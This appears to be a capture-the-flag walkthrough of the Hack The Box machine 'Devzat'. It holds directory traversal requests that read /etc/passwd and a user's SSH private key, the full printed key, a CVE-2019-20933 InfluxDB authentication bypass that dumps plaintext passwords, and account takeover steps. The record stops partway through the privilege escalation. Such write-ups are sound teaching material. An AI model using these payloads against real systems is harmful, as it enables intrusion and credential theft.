# [devzat](https://app.hackthebox.com/machines/Devzat)

> A Linux server publicly hosting [Devzat](https://github.com/quackduck/devzat), an SSH chatting application, a web application advertising Devzat, and a pet inventory web application. The latter is vulnerable to a directory traversal attack, making it possible to leak a user's SSH private key and gain a low-privilege shell. The server is serving [InfluxDB](https://www.influxdata.com/) on `localhost`. The particular version it is serving is vulnerable to CVE-2019-20933, an authentication bypass vulnerability that makes it possible to dump its measurements (tables), revealing another user's plaintext password. This user has the ability to read the source code of a development version of Devzat that is being served on `localhost`. This development version contains a feature that allows users to read files on the server. This feature is vulnerable to a directory traversal attack, making it possible to leak `root`'s SSH private key and access the system as `root`.

---

## Open Port Enumeration

The target's TCP ports 22, 80, and 8000 are open.

```bash
$ sudo masscan -p1-65535 --rate 1000 -e tun0 --output-format grepable --output-filename enum/devzat.masscan 10.129.137.148
$ cat enum/devzat.masscan | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80,8000,
```

According to [launchpad.net](https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.2), the OpenSSH banner indicates the target's operating system is likely Ubuntu 20.04 (Focal).

Apache 2.4.41 is running on port 80, redirect to `http://devzat.htb`. Add this to the local DNS resolver.

`nmap` flags the service running on port 80 as SSH-2.0-Go.

```bash
$ nmap -sC -sV -p22,80,8000 10.129.137.148 -oA enum/devzat
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-13 19:09 EDT
Nmap scan report for 10.129.137.148
Host is up (0.046s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     (protocol 2.0)
| ssh-hostkey:
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-Go
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.92%I=7%D=3/13%Time=622E79AE%P=x86_64-pc-linux-gnu%r(NU
SF:LL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.06 seconds
```

---

## Port 22 Enumeration

Public key authentication only.

```bash
$ ssh blah@devzat.htb
blah@devzat.htb: Permission denied (publickey).
```

---

## Port 8000 Enumeration

Port 8000 appears to be serving [Devzat](https://github.com/quackduck/devzat), a chat application over SSH. It uniquely identifies users by their public keys, allowing them to "authenticate" as any nickname they'd like to be known as.

```bash
$ ssh blah@devzat.htb -p 8000 -v
OpenSSH_8.7p1 Debian-2, OpenSSL 1.1.1l  24 Aug 2021
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to devzat.htb [10.129.137.148] port 8000.
debug1: Connection established.
debug1: identity file /home/tgihf/.ssh/id_rsa type 0
debug1: identity file /home/tgihf/.ssh/id_rsa-cert type -1
debug1: identity file /home/tgihf/.ssh/id_dsa type -1
debug1: identity file /home/tgihf/.ssh/id_dsa-cert type -1
debug1: identity file /home/tgihf/.ssh/id_ecdsa type -1
debug1: identity file /home/tgihf/.ssh/id_ecdsa-cert type -1
debug1: identity file /home/tgihf/.ssh/id_ecdsa_sk type -1
debug1: identity file /home/tgihf/.ssh/id_ecdsa_sk-cert type -1
debug1: identity file /home/tgihf/.ssh/id_ed25519 type -1
debug1: identity file /home/tgihf/.ssh/id_ed25519-cert type -1
debug1: identity file /home/tgihf/.ssh/id_ed25519_sk type -1
debug1: identity file /home/tgihf/.ssh/id_ed25519_sk-cert type -1
debug1: identity file /home/tgihf/.ssh/id_xmss type -1
debug1: identity file /home/tgihf/.ssh/id_xmss-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_8.7p1 Debian-2
debug1: Remote protocol version 2.0, remote software version Go
debug1: compat_banner: no match: Go
debug1: Authenticating to devzat.htb:8000 as 'blah'
debug1: load_hostkeys: fopen /home/tgihf/.ssh/known_hosts2: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: curve25519-sha256@libssh.org
debug1: kex: host key algorithm: ssh-rsa
debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: SSH2_MSG_KEX_ECDH_REPLY received
debug1: Server host key: ssh-rsa SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI
debug1: load_hostkeys: fopen /home/tgihf/.ssh/known_hosts2: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
debug1: Host '[devzat.htb]:8000' is known and matches the RSA host key.
debug1: Found key in /home/tgihf/.ssh/known_hosts:52
debug1: rekey out after 134217728 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey in after 134217728 blocks
debug1: Will attempt key: /home/tgihf/.ssh/id_rsa RSA SHA256:U1dbHSKAvfIx+jMXaigw9t4Ym40HIoaa5LWmRQXOu3I
debug1: Will attempt key: /home/tgihf/.ssh/id_dsa
debug1: Will attempt key: /home/tgihf/.ssh/id_ecdsa
debug1: Will attempt key: /home/tgihf/.ssh/id_ecdsa_sk
debug1: Will attempt key: /home/tgihf/.ssh/id_ed25519
debug1: Will attempt key: /home/tgihf/.ssh/id_ed25519_sk
debug1: Will attempt key: /home/tgihf/.ssh/id_xmss
debug1: SSH2_MSG_SERVICE_ACCEPT received
Authenticated to devzat.htb ([10.129.137.148]:8000) using "none".
debug1: channel 0: new [client-session]
debug1: Entering interactive session.
debug1: pledge: filesystem full
debug1: Sending environment.
debug1: channel 0: setting env LANG = "en_US.UTF-8"

1 minute earlier
devbot: You seem to be new here blah. Welcome to Devzat! Run /help to see what you can do.
devbot: blah has joined the chat
devbot: blah has left the chat
devbot: blah has joined the chat
devbot: blah has left the chat
Welcome to the chat. There are no more users
devbot: blah has joined the chat
```

The `help` command:

```txt
blah: /help
[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.
[SYSTEM]
[SYSTEM] Interesting features:
[SYSTEM] • Many, many commands. Run /commands.
[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.
[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.
[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.
[SYSTEM] • Emoji replacements! (like on Slack and Discord)
[SYSTEM]
[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
[SYSTEM]
[SYSTEM] Made by Ishan Goel with feature ideas from friends.
[SYSTEM] Thanks to Caleb Denio for lending his server!
[SYSTEM]
[SYSTEM] For a list of commands run
[SYSTEM] ┃ /commands
```

There's only one room, `main`:

```txt
blah: /room
[SYSTEM] You are currently in #main
[SYSTEM] Rooms and users
[SYSTEM] #main: [blah]
```

Available commands:

```txt
blah: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
```

There are no other users.

---

## Devzat Website Enumeration

Website advertising the [Devzat](https://github.com/quackduck/devzat) SSH chat application. Fairly static.

Found `patrick@devzat.htb` near the bottom of the page.

### Content Discovery

Nothing really of interest here.

```bash
$ feroxbuster -u http://devzat.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://devzat.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      309c http://devzat.htb/images => http://devzat.htb/images/
301      GET        9l       28w      309c http://devzat.htb/assets => http://devzat.htb/assets/
301      GET        9l       28w      313c http://devzat.htb/javascript => http://devzat.htb/javascript/
301      GET        9l       28w      313c http://devzat.htb/assets/css => http://devzat.htb/assets/css/
301      GET        9l       28w      312c http://devzat.htb/assets/js => http://devzat.htb/assets/js/
301      GET        9l       28w      320c http://devzat.htb/assets/css/images => http://devzat.htb/assets/css/images/
403      GET        9l       28w      275c http://devzat.htb/server-status
[####################] - 2m    419986/419986  0s      found:7       errors:581
[####################] - 2m     59998/59998   412/s   http://devzat.htb
[####################] - 2m     59998/59998   400/s   http://devzat.htb/images
[####################] - 2m     59998/59998   393/s   http://devzat.htb/assets
[####################] - 2m     59998/59998   394/s   http://devzat.htb/javascript
[####################] - 2m     59998/59998   402/s   http://devzat.htb/assets/css
[####################] - 2m     59998/59998   400/s   http://devzat.htb/assets/js
[####################] - 2m     59998/59998   411/s   http://devzat.htb/assets/css/images
```

### Virtual Host Discovery

It appears that most of the virtual hosts return 302s, the same behavior as `http://devzat.htb`. Use [this script](https://gist.github.com/tgihf/4c8f510ba18c392aa9a849549a048a8c) to parse the `gobuster vhost` output and `jq` to filter away the 302s. `pets.devzat.htb` is the only one that returns a 200. Add this to the local DNS resolver.

```bash
$ gobuster vhost -u http://devzat.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt >  output.txt
$ python3 gobuster-vhost-to-json.py --file output.txt | jq '.[] | select(.status != 302)'
{
  "hostname": "pets.devzat.htb",
  "status": 200,
  "size": 510
}
```

---

## Pet Inventory Web Application Enumeration

`http://pets.devzat.htb` is an inventory of someone's pets.

![](images/Pasted%20image%2020220313223312.png)

The server's `Server` header is `My genious go pet server`, indicating it is probably written in Golang.

Navigating to `/` results in a request to `/build/main.js`, which appears to be a JavaScript frontend bundle. This bundle triggers an API call to `/api/pet`, which returns a JSON list of all the pet objects which are subsequently rendered.

```http
GET /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Connection: close
```

```http
HTTP/1.1 200 OK
Date: Sun, 13 Mar 2022 23:41:39 GMT
Server: My genious go pet server
Content-Type: text/plain; charset=utf-8
Vary: Accept-Encoding
Content-Length: 2093
Connection: close

[{"name":"Cookie","species":"cat","characteristics":"Having a cat is like living in a shared apartment. Most of the time you mind your own business. From time to time you hang out together watching TV. And sometimes you find puke somewhere...\n"},{"name":"Mia","species":"cat","characteristics":"Having a cat is like living in a shared apartment. Most of the time you mind your own business. From time to time you hang out together watching TV. And sometimes you find puke somewhere...\n"},{"name":"Chuck","species":"dog","characteristics":"A dog will teach you unconditional love. If you can have that in your life, things won't be too bad."},{"name":"Balu","species":"dog","characteristics":"A dog will teach you unconditional love. If you can have that in your life, things won't be too bad."},{"name":"Georg","species":"gopher","characteristics":"Gophers use their long teeth to help build tunnels – to cut roots, loosen rocks and push soil away. Gophers have pouches in their cheeks that they use to carry food, hence the term “pocket” gopher. Gophers are generally solitary creatures that prefer to live alone except for brief mating periods."},{"name":"Gustav","species":"giraffe","characteristics":"With those extra long legs it is not surprising that a giraffe's neck is too short to reach the ground! Giraffes have a dark bluish tongue that is very long – approximately 50 centimetres (20 inches). Male giraffes fight with their necks."},{"name":"Rudi","species":"redkite","characteristics":"The wingspan of Red Kites can reach up to 170 cm (67 inch). Considering this large wingspan, the kites are very light birds, weighing no more than 0.9-1.3 kg (2.0-2.9 Punds)! The lifespan of Red Kites is usually around 4-5 years, but they can grow as old as 26 years of age! Red Kites have bright yellow legs and a yellow bill with a brown tip."},{"name":"Bruno","species":"bluewhale","characteristics":"The mouth of the blue whale contains a row of plates that are fringed with 'baleen', which are similar to bristles. Also the tongue of the blue whale is as big as an elephant."}]
```

It is also possible to add pets to the inventory. Submission of the form on the page results in the following request:

```http
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 32
Connection: close

{"name":"Riley","species":"dog"}
```

```http
HTTP/1.1 200 OK
Date: Sun, 13 Mar 2022 23:50:09 GMT
Server: My genious go pet server
Content-Length: 26
Content-Type: text/plain; charset=utf-8
Connection: close

Pet was added successfully
```

This triggers another request to `/api/pet` to update the page.

---

## Initial Access: Pet Inventory Arbitrary File Read

It appears that adding a pet with a nonexistent species results in a `Characteristics` column value `exit status 1`. This indicates that some kind of shell command is being leveraged to retrieve the `Characterics` value. In fact, it appears that the application is attempting to read the `Characteristics` from a file whose name is the `species` value.

Indeed, the `species` parameter of the `POST /api/pet` request is vulnerable to directory traversal.

```http
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 47
Connection: close

{"name":"'","species":"../../../../etc/passwd"}
```

![](images/Pasted%20image%2020220313201005.png)

Reading `/etc/passwd` discloses three interactive users: `root`, `patrick`, and `catherine`.

Abuse this vulnerability to read `patrick`'s SSH private key.

```http
POST /api/pet HTTP/1.1
Host: pets.devzat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://pets.devzat.htb/
Content-Type: text/plain;charset=UTF-8
Origin: http://pets.devzat.htb
Content-Length: 61
Connection: close

{"name":"'","species":"../../../../home/patrick/.ssh/id_rsa"}
```

```txt
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Use the key to login as `patrick`.

```bash
$ ssh -i patrick patrick@devzat.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 14 Mar 2022 12:15:24 AM UTC

  System load:              0.02
  Usage of /:               56.6% of 7.81GB
  Memory usage:             27%
  Swap usage:               0%
  Processes:                233
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.129.137.148
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:e5d7


107 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

patrick@devzat:~$ id
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick)
```

---

## Situational Awareness as `patrick`

Accessing Devzat as `patrick` shows a recent conversation with his boss (Devzat user `admin`). The boss indicates they set up an [InfluxDB](https://www.influxdata.com/) instance for `patrick`.

```bash
patrick@devzat:~/devzat$ ssh patrick@devzat.htb -p 8000
The authenticity of host '[devzat.htb]:8000 ([127.0.0.1]:8000)' can't be established.
RSA key fingerprint is SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[devzat.htb]:8000' (RSA) to the list of known hosts.
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb for you as we discussed earlier in business meeting.
patrick: Cool 👍
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
devbot: admin has left the chat
Welcome to the chat. There are no more users
devbot: patrick has joined the chat
patrick:
```

It appears InfluxDB is running as a Docker container, exposed on port 8086.

```bash
patrick@devzat:~/devzat$ ps auxef
...
root        1018  0.0  4.5 946772 91092 ?        Ssl  Mar13   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        1251  0.0  0.1 549056  3892 ?        Sl   Mar13   0:00  \_ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8086 -container-ip 172
...
```

The target is listening on ports 8086 (InfluxDB), 8443, and 5000 on `localhost`.

```bash
patrick@devzat:~/devzat$ ss -antl
State             Recv-Q            Send-Q                       Local Address:Port                         Peer Address:Port            Process
LISTEN            0                 4096                         127.0.0.53%lo:53                                0.0.0.0:*
LISTEN            0                 4096                             127.0.0.1:8086                              0.0.0.0:*
LISTEN            0                 128                                0.0.0.0:22                                0.0.0.0:*
LISTEN            0                 4096                             127.0.0.1:8443                              0.0.0.0:*
LISTEN            0                 4096                             127.0.0.1:5000                              0.0.0.0:*
LISTEN            0                 511                                      *:80                                      *:*
LISTEN            0                 128                                   [::]:22                                   [::]:*
LISTEN            0                 4096                                     *:8000                                    *:*
```

---

## Lateral Movement: InfluxDB Authentication Bypass & Credential Disclosure

InfluxDB is running on the target's `localhost`:8086. Use `patrick`'s SSH private key to initiate a local port forward from local 8086 to this port.

```bash
$ ssh -i patrick patrick@devzat.htb -L 8086:localhost:8086 -NT

```

Connecting to the InfluxDB instance at `localhost`:8086 indicates its version is 1.7.5.

```bash
$ influx
Connected to http://localhost:8086 version 1.7.5
InfluxDB shell version: 1.6.7~rc0
>
```

There exists an authentication bypass vulnerability (CVE-2019-20933) in all InfluxDB versions before 1.7.6. This makes it possible to interact with the database. 

Download the [exploit](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933) from here. Create a list of potential users to attempt to login as and launch the exploit, achieving access as the `admin` user.

```bash
$ cat users.txt
patrick
catherine
root
admin
$ python3 InfluxDB-Exploit-CVE-2019-20933/__main__.py

  _____        __ _            _____  ____    ______            _       _ _
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |
                                                         |_|
 - using CVE-2019-20933

Host (default: localhost):
Port (default: 8086):
Username <OR> path to username file (default: users.txt):

Bruteforcing usernames ...
[x] patrick
[x] catherine
[x] root
[v] admin

Host vulnerable !!!

Databases:

1) devzat
2) _internal

.quit to exit
```

Select the `devzat` database. It has a single measurement, `user`.

```bash
[admin@127.0.0.1/devzat] $ show measurements
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "user"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

The `user` measure contains three columns: `enabled`, `password`, and `username`.

```bash
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "enabled",
                            "boolean"
                        ],
                        [
                            "password",
                            "string"
                        ],
                        [
                            "username",
                            "string"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

The `user` measurement contains three entries, disclosing the credentials `wilhelm`:`WillyWonka2021`, `catherine`:`woBeeYareedahc7Oogeephies7Aiseci`, and `charles`:`RoyalQueenBee$`.

```bash
[admin@127.0.0.1/devzat] $ select * from "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

Use `catherine`'s password to switch to her account and grab the user flag from `/home/catherine/user.txt`.

```bash
patrick@devzat:~$ su catherine
Password:
catherine@devzat:/home/patrick$ id
uid=1001(catherine) gid=1001(catherine) groups=1001(catherine)
catherine@devzat:/home/patrick$ ls -la ~/user.txt
-r-------- 1 catherine catherine 33 Mar 13 23:01 /home/catherine/user.txt
```

---

## Privilege Escalation: Custom Devzat Command & Arbitrary File Read

Connecting to Devzat as `catherine` shows a recent conversation she had with `patrick`. Apparently he has implemented a new feature for something and it is running on port 8443. The password that `patrick` previously gave `catherine` is required to access it. The source code is in "backups."

```bash
catherine@devzat:~$ ssh catherine@localhost -p 8000
The authenticity of host '[localhost]:8000 ([127.0.0.1]:8000)' can't be established
RSA key fingerprint is SHA256:f8dMo2xczXRRA43d9weJ7ReJdZqiCxw5vP7XqBaZutI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:8000' (RSA) to the list of known hosts.
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password I gave you last time.
catherine: k
patrick: I left the source for your review in backups.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat
catherine:
```

There is a main and a development version of Devzat in `/var/backups/`. The new feature `patrick` added must have been to Devzat, and the development version must be running on the target's `localhost`:8443.

```bash
catherine@devzat:/var/backups$ ls -la
total 140
drwxr-xr-x  2 root      root       4096 Sep 29 16:25 .
drwxr-xr-x 14 root      root       4096 Jun 22  2021 ..
-rw-r--r--  1 root      root      59142 Sep 28 18:45 apt.extended_states.0
-rw-r--r--  1 root      root       6588 Sep 21 20:17 apt.extended_states.1.gz
-rw-r--r--  1 root      root       6602 Jul 16  2021 apt.extended_states.2.gz
